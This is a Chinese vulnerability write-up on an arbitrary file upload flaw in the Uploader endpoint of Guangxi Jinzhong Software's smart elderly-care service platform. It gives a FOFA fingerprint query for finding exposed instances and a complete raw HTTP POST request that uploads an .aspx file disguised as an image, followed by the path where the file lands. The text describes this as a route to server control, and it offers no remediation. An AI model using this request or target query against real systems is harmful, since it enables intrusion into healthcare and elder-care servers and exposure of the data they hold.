# 广西金中软件集团有限公司智慧医养服务平台Uploader存在任意文件上传漏洞

# 一、漏洞简介
广西金中软件集团有限公司前身成立于1999年，隶属于广西电信下的三产公司——金中信息产业有限公司，是一家集软件开发、网站建设、网络工程、系统集成和维护服务、通信增值业务和ISP运营服务于一体的高科技IT企业。广西金中软件集团有限公司智慧医养服务平台Uploader存在任意文件上传漏洞，攻击者可通过该漏洞获取服务器权限。

# 二、影响版本
+ 智慧医养服务平台

# 三、资产测绘
+ fofa`body="Content/css/Login/images/gtx-main-bg00004.png"`
+ 特征

![1721291803179-fa0d3eb8-c0c1-498b-929f-3a07eab9d2cc.png](./img/jyyVjV_3Jtln2pe9/1721291803179-fa0d3eb8-c0c1-498b-929f-3a07eab9d2cc-698303.png)

# 四、漏洞复现
```plain
POST /DevApi/Uploader HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: */*
Content-Type: multipart/form-data; boundary=---------------------------45250802924973458471174811279
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Length: 10338

-----------------------------45250802924973458471174811279
Content-Disposition: form-data; name="file"; filename="1.aspx"
Content-Type: image/png

123
-----------------------------45250802924973458471174811279
```

![1721291820700-2d586dfe-9e61-4b58-94da-3f3b67d8878c.png](./img/jyyVjV_3Jtln2pe9/1721291820700-2d586dfe-9e61-4b58-94da-3f3b67d8878c-790966.png)

```plain
/Content/Upload/202407/18/1.aspx
```

![1721291836932-3446c6bb-c27e-461f-a28a-c4e56ac1aa48.png](./img/jyyVjV_3Jtln2pe9/1721291836932-3446c6bb-c27e-461f-a28a-c4e56ac1aa48-000517.png)



> 更新: 2024-10-22 09:37:51  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/payri8rhhk98f9mm>